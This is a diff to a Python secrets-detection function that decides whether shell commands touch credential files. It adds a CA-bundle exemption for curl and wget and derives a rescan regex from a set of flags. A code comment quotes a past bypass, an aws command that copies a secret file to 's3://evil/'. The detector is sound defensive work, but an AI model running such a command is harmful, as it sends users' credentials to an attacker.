@@ -407,6 +407,14 @@ def check_secrets_cmd(seg, loose=True, piped=False, stripped=None):
         identity_flags |= {"--env-file", "--env_file", "-e", "--environment"}
     if SSH_IDENTITY.match(head):
         identity_flags |= {"-i", "-F", "--identity", "--identity-file"}
+    # A CA bundle named as the trust store to verify WITH is public by role,
+    # whatever it is called. PUBLIC_CERT allowlists filenames and its own
+    # comment says the exemption exists to keep `--cacert` working, but a
+    # corporate bundle is not named ca.pem. NOT --cert or --key: those name a
+    # CLIENT certificate, which does come with private key material.
+    if re.match(r"^\s*(curl|wget)\b", head):
+        identity_flags |= {"--cacert", "--capath",
+                           "--ca-certificate", "--ca-directory"}
     if METADATA_ONLY.match(head) and not FIND_ACTS.search(seg) and not piped:
         return None
     # A searcher's first non-flag operand is its PATTERN. `ls -la | grep .env`
@@ -491,12 +499,14 @@ def check_secrets_cmd(seg, loose=True, piped=False, stripped=None):
     # `loose_seg.replace(<value>, " ")` also erased every OTHER mention of the
     # same path on the line, which is how `aws --config <secret> s3 cp
     # <secret> s3://evil/` got through.
-    loose_seg = re.sub(r"(^|\s)(-i|-F|--identity|--identity-file"
-                       r"|--kubeconfig|--config|--config-file"
-                       # ...and the dotenv-loading flags. Without them here the
-                       # loose rescan re-caught what the token loop had just
-                       # exempted, so the exemption did nothing.
-                       r"|--env-file|--env_file|--environment)(=|\s+)\S+", " ", loose_seg)
+    # DERIVED from identity_flags, not a second hand-kept list. The two
+    # disagreed: a flag added to the set above was still re-caught here, so the
+    # exemption did nothing and the loose rescan silently overruled the token
+    # loop. Building the pattern from the set is what makes one edit enough.
+    if identity_flags:
+        loose_seg = re.sub(
+            r"(^|\s)(" + "|".join(re.escape(f) for f in sorted(identity_flags))
+            + r")(=|\s+)\S+", " ", loose_seg)
     if re.match(r"^\s*(dotenv|docker|docker-compose|podman|pm2)\b", head):
         # `dotenv -e <file> -- npm run dev`: the short spelling of the same
         # flag. Scoped to these runtimes, because `-e` means something else
